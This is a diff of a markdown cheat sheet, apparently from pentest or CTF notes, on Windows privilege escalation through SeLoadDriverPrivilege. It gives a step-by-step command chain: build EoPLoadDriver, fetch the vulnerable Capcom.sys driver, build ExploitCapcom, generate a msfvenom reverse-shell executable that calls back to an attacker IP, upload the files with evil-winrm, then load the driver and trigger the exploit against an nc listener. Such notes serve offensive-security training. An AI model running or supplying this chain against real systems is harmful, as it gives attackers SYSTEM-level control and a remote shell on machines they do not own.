@@ -9,7 +9,7 @@ tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "disks
 
 #### 1. Compile eoploaddriver
 
-[eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
+<div>
 
 ```bash
 +---------------------------------------------------------------------------------------+
@@ -25,13 +25,17 @@ tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "disks
 +---------------------------------------------------------------------------------------+
 ```
 
+</div>
+
+<small>*Ref: [eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)*</small>
+
 #### 2. Download Capcom.sys
 
 [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
 
 #### 3. Compile ExploitCapcom
 
-[ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)
+<div>
 
 ```bash
 +----------------------------------------------------------------------------------------+
@@ -43,13 +47,23 @@ tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "disks
 +----------------------------------------------------------------------------------------+
 ```
 
+</div>
+
+<small>*Ref: [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)*</small>
+
 #### 3. Create stageless payload
+
+<div>
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o rev.exe
 ```
 
+</div>
+
 #### 4. Upload
+
+<div>
 
 ```powershell
 # For example (evil-winrm)
@@ -68,7 +82,11 @@ upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
 upload rev.exe C:\ProgramData\rev.exe
 ```
 
+</div>
+
 #### 5. Exploit
+
+<div>
 
 ```bash
 # Start a nc listener
@@ -82,5 +100,7 @@ C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Ca
 ```powershell
 C:\ProgramData\ExploitCapcom.exe
 ```
+
+</div>
 
 <br>
